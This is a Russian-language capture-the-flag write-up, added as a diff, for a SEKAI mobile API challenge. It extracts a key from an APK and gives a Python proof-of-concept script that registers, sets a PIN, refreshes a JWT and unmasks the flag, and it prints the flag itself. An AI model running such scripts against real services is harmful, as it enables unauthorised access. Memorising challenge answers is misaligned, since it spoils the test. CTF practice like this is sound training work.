@@ -1,0 +1,57 @@
+[+] CTF Writeup: Mobile API Challenge (SEKAI) решено с использованнием ChatGPT5
+
+1. Recon
+-----------
+- Из APK был извлечён секретный ключ:
+  3f3cf8830acc96530d5564317fe480ab581dfc55ec8fe55e67dddbe1fdb605be
+- На сервере нашёлся endpoint /health, который подтвердил работу API.
+
+2. User Flow
+-----------
+- API требовало регистрацию и логин.
+- После регистрации возвращался accessToken (JWT).
+- Логин также выдавал accessToken.
+- PIN функционал: setup и verify. Для корректного доступа к флагу нужно было выставить и подтвердить 6-значный PIN.
+
+3. Problem
+-----------
+- Простое обращение к /flag возвращало только маску:
+  SEKAI{*************************************}
+- Попытки с body {reveal:true}, {token} и без авторизации давали ту же маску.
+
+4. Solution
+-----------
+- После успешного setup и verify PIN сервер ожидал обновление токена через endpoint /auth/refresh.
+- Новый accessToken включал нужные данные (userId + username).
+- С этим токеном запрос к /flag с телом {"unmask_flag":true} дал полный флаг.
+
+5. Exploit PoC
+-----------
+Пример на Python:
+
+```python
+import requests
+
+BASE = "https://target/api"
+key = "3f3cf8830acc96530d5564317fe480ab581dfc55ec8fe55e67dddbe1fdb605be"
+
+# 1. Register
+r = requests.post(f"{BASE}/register", json={"username":"ctfuser","email":"a@b.c","password":"pass"})
+token = r.json()["data"]["accessToken"]
+
+# 2. Setup PIN
+requests.post(f"{BASE}/pin/setup", json={"pin":"123456"}, headers={"Authorization":f"Bearer {token}"})
+requests.post(f"{BASE}/pin/verify", json={"pin":"123456"}, headers={"Authorization":f"Bearer {token}"})
+
+# 3. Refresh token
+r = requests.post(f"{BASE}/auth/refresh", headers={"Authorization":f"Bearer {token}"})
+token = r.json()["data"]["accessToken"]
+
+# 4. Get flag
+r = requests.post(f"{BASE}/flag", json={"unmask_flag":True}, headers={"Authorization":f"Bearer {token}"})
+print(r.text)
+```
+
+6. Flag
+-----------
+SEKAI{are-you-ready-for-the-real-challenge?}
